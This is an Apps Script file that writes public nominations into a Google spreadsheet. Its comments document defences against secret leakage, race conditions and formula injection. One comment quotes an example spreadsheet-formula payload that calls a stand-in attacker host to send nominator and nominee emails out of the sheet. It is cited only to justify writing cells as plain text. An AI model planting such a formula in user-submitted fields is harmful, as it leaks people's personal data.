/* Apps Script for the IFF nominations spreadsheet.
 *
 * This file is NOT run by the site. It is pasted into the spreadsheet itself,
 * at Extensions -> Apps Script, and deployed as a web app. It lives in the
 * repository so the script the sheet runs is versioned next to
 * lib/nomination-sheet.mjs, which calls it -- otherwise the only copy would be
 * inside one person's Google account, with no history and no review.
 *
 * It does NOT have to be created from the spreadsheet. It addresses the sheet
 * by id, so a standalone project in any account with edit access to that sheet
 * works too -- which is the way round it has to be when the spreadsheet is
 * owned by someone else, since only a file's owner can deploy a script bound
 * to it.
 *
 * SETUP, once, IN THIS ORDER:
 *   1. Either the spreadsheet -> Extensions -> Apps Script (if you own the
 *      sheet), or script.google.com -> New project (if it was shared with
 *      you). Set SHEET_ID below either way.
 *   2. Replace everything in Code.gs with this file.
 *   3. Change SECRET below to a long random string, BEFORE deploying.
 *      Generate one with:
 *        node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
 *      Deploying first would publish a writable URL whose secret is the
 *      placeholder printed in this public repository. doPost refuses to run
 *      until this is changed, so a mistake here fails closed rather than open.
 *   4. Make sure the tab named by TAB is either EMPTY or already has exactly
 *      the header the site sends. The site sends its header with every write
 *      and this script refuses to write when row 1 disagrees -- a tab with any
 *      other row 1 rejects every nomination, and the nominator still sees
 *      success, so the rejection is quiet. An empty tab is simplest: this
 *      script writes the header itself on the first nomination.
 *   5. Deploy -> New deployment -> type "Web app".
 *        Execute as:      Me
 *        Who has access:  Anyone
 *      "Anyone" is required -- Vercel's functions sign in as nobody. The URL is
 *      public, which is why the secret is the actual guard.
 *   6. Authorise when prompted, then copy the /exec URL.
 *   7. In Vercel set IFF_SHEET_WEBHOOK_URL to that URL and IFF_SHEET_SECRET to
 *      the same string as SECRET. Redeploy.
 *
 * AFTER ANY EDIT to this script you must Deploy -> Manage deployments -> edit
 * -> New version. Saving alone changes nothing: the deployed URL keeps serving
 * the old code, which is the most common way a change here appears to do
 * nothing at all.
 */

/* Must match IFF_SHEET_SECRET in Vercel. The deployed URL is public, so this
   is what actually stops anyone who finds it from writing rows into the
   sheet. */
const SECRET = 'PASTE_A_LONG_RANDOM_STRING_HERE';

/* The spreadsheet, named explicitly rather than taken from context.
 *
 * SpreadsheetApp.getActive() only works in a script BOUND to a spreadsheet --
 * one created from that sheet's Extensions -> Apps Script. In a standalone
 * project it returns null and every nomination fails with no_such_tab.
 *
 * Naming the id works in both cases, and means this script can live in
 * whichever Google account can actually deploy it: a bound script belongs to
 * the spreadsheet's OWNER, so an editor who was merely shared the file cannot
 * create a deployment of it at all -- which presents as "You do not have
 * permission to perform this action" and looks like an account problem.
 *
 * Whoever deploys this must have edit access to the spreadsheet, because the
 * web app runs as them ("Execute as: Me"). */
const SHEET_ID = '14XVJS_Y0Joqb8tqxdLdRjZz5SY3DVAdVJHCClfridbE';

const TAB = 'IFF Nominations List';

/* Shorter than the caller's own budget (BUDGET_MS in lib/nomination-sheet.mjs)
   with room left for the write. If this wait could outlast the caller, a
   nomination could be written successfully AFTER the caller gave up -- the
   operator would then re-enter by hand a row that is already there. */
const LOCK_WAIT_MS = 5000;

/* Apps Script cannot set an HTTP status code -- ContentService always answers
   200. So every outcome is reported in the BODY, and lib/nomination-sheet.mjs
   checks `ok` rather than the status. A caller that trusted the status alone
   would read every failure as a success and silently lose rows. */
function reply(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

/* Compares in time that does not depend on how many leading characters match.
   A plain === leaks the length of the common prefix through timing, which over
   many attempts is enough to recover a secret one character at a time.

   configured() is separate and checked FIRST: an empty SECRET would make the
   length test 0 === 0 and the loop run zero times, so every request -- including
   one carrying no secret at all -- would authenticate. This has to fail closed. */
function configured() {
  return typeof SECRET === 'string' && SECRET.length >= 32 && SECRET.indexOf('PASTE_') !== 0;
}

function secretMatches(given) {
  var a = String(given == null ? '' : given);
  if (a.length !== SECRET.length) return false;
  var diff = 0;
  for (var i = 0; i < SECRET.length; i++) {
    diff |= a.charCodeAt(i) ^ SECRET.charCodeAt(i);
  }
  return diff === 0;
}

/* The grid has a fixed size and getRange throws past its edge rather than
   growing it. A tab trimmed to 100 rows, or narrower than the header, would
   otherwise start failing at an arbitrary nomination -- or at the very first
   one -- with nothing but an opaque error. */
function ensureRoom(sheet, rows, columns) {
  var maxRows = sheet.getMaxRows();
  if (maxRows < rows) sheet.insertRowsAfter(maxRows, rows - maxRows);
  var maxColumns = sheet.getMaxColumns();
  if (maxColumns < columns) sheet.insertColumnsAfter(maxColumns, columns - maxColumns);
}

/* Writes one row as TEXT.
 *
 * setValues interprets a string beginning with "=" as a FORMULA. A nominee
 * description is free text written by the public, so without this a nomination
 * reading =IMPORTXML("https://evil.example/?"&D2,"//a") becomes a live formula
 * that exfiltrates the panel's sheet -- every nominator and nominee email in
 * it -- the moment a judge opens the tab. Setting the number format to "@"
 * (plain text) first makes Sheets store the characters instead of evaluating
 * them. It must happen BEFORE setValues, not after. */
function writeTextRow(sheet, rowNumber, values) {
  var range = sheet.getRange(rowNumber, 1, 1, values.length);
  range.setNumberFormat('@');
  range.setValues([values.map(String)]);
}

function doPost(e) {
  try {
    /* Before anything else. A deployment made before step 3 of SETUP would
       otherwise be writable by anyone who read the placeholder in this repo. */
    if (!configured()) {
      return reply({ ok: false, error: 'misconfigured' });
    }

    if (!e || !e.postData || !e.postData.contents) {
      return reply({ ok: false, error: 'empty_request' });
    }

    var body;
    try {
      body = JSON.parse(e.postData.contents);
    } catch (parseError) {
      return reply({ ok: false, error: 'bad_json' });
    }

    if (!secretMatches(body.secret)) {
      return reply({ ok: false, error: 'forbidden' });
    }

    var header = body.header;
    var row = body.row;
    if (!Array.isArray(header) || !Array.isArray(row) || header.length !== row.length) {
      return reply({ ok: false, error: 'bad_shape' });
    }

    var book;
    try {
      book = SpreadsheetApp.openById(SHEET_ID);
    } catch (openError) {
      /* Distinct from a missing tab: the id is wrong, or the account this web
         app runs as has not been given access to the spreadsheet. */
      return reply({ ok: false, error: 'no_access' });
    }
    var sheet = book.getSheetByName(TAB);
    if (!sheet) return reply({ ok: false, error: 'no_such_tab' });

    /* A lock because two nominations arriving together would otherwise both
       read the same last row and the second would overwrite the first. */
    var lock = LockService.getScriptLock();
    try {
      lock.waitLock(LOCK_WAIT_MS);
    } catch (lockError) {
      return reply({ ok: false, error: 'busy' });
    }

    try {
      ensureRoom(sheet, sheet.getLastRow() + 1, header.length);
      var lastRow = sheet.getLastRow();

      if (lastRow === 0) {
        /* An empty tab gets the header first. Appending to one without it
           would make the first nomination the header row, burying its answers
           as column names. */
        writeTextRow(sheet, 1, header);
        lastRow = 1;
      } else {
        /* The row is written by POSITION. If row 1 stops matching the columns
           the site is sending -- someone inserts a column, reorders one, or
           TAB names the older "Questions" tab -- every later nomination would
           land shifted, under the right headings but in the wrong columns, and
           nothing would fail. Refusing is the only safe answer. */
        var present = sheet.getRange(1, 1, 1, header.length).getValues()[0];
        for (var i = 0; i < header.length; i++) {
          if (String(present[i]).trim() !== String(header[i]).trim()) {
            return reply({
              ok: false,
              error: 'header_mismatch',
              column: i + 1,
              expected: String(header[i]),
              found: String(present[i])
            });
          }
        }
      }

      var target = lastRow + 1;
      ensureRoom(sheet, target, row.length);
      writeTextRow(sheet, target, row);

      /* Spreadsheet writes are buffered and committed when the script ends.
         Without this the lock would be released while the row is still
         pending, the next request would read a stale last row, and one of two
         simultaneous nominations would be overwritten -- with both callers
         told they succeeded. The flush has to be inside the lock. */
      SpreadsheetApp.flush();

      return reply({ ok: true, row: target });
    } finally {
      lock.releaseLock();
    }
  } catch (error) {
    /* The message, never error.stack: a stack can quote the source of this
       file, and this file holds the secret. */
    return reply({ ok: false, error: 'script_error', message: String(error && error.message) });
  }
}

/* Opening the /exec URL in a browser hits this. It deliberately says nothing
   useful: the URL is public, and confirming what sits behind it helps nobody
   who should be here. */
function doGet() {
  return reply({ ok: false, error: 'post_only' });
}
